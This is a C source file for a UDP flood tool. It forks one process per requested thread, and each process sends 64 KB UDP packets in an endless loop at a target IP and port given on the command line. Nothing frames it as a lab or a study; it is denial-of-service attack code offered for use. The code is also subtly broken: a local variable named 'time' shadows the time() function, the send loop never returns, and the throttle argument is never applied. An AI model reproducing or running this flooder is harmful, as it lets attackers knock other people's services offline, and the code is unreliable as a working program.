#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>

#define MAX_PACKET_SIZE 65536
#define PPS_LIMIT 1000000 // Adjust as needed

void send_udp_packet(char *target_ip, int port) {
    struct sockaddr_in dest_addr;
    int sock;
    char packet[MAX_PACKET_SIZE];

    // Create UDP socket
    if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1) {
        perror("socket");
        exit(1);
    }

    // Set destination address
    memset((char *)&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(port);
    dest_addr.sin_addr.s_addr = inet_addr(target_ip);

    // Prepare UDP packet
    memset(packet, 0, MAX_PACKET_SIZE);

    // Send UDP packet
    while (1) {
        if (sendto(sock, packet, MAX_PACKET_SIZE, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) == -1) {
            perror("sendto");
            close(sock);
            exit(1);
        }
    }

    close(sock);
}

int main(int argc, char *argv[]) {
    if (argc != 6) {
        printf("Usage: %s <target IP> <port> <throttle> <thread> <time>\n", argv[0]);
        exit(1);
    }

    char *target_ip = argv[1];
    int port = atoi(argv[2]);
    int throttle = atoi(argv[3]);
    int thread = atoi(argv[4]);
    int time = atoi(argv[5]);

    int pps = throttle * thread;

    if (pps > PPS_LIMIT) {
        printf("Throttle * Thread exceeds PPS limit of %d\n", PPS_LIMIT);
        exit(1);
    }

    int i;
    for (i = 0; i < thread; i++) {
        if (fork() == 0) {
            int start_time = time(NULL);
            int sent_packets = 0;
            while (time(NULL) - start_time < time) {
                send_udp_packet(target_ip, port);
                sent_packets++;
            }
            printf("[%d] Sent %d packets\n", getpid(), sent_packets);
            exit(0);
        }
    }

    while (1) {
        sleep(1);
    }

    return 0;
}
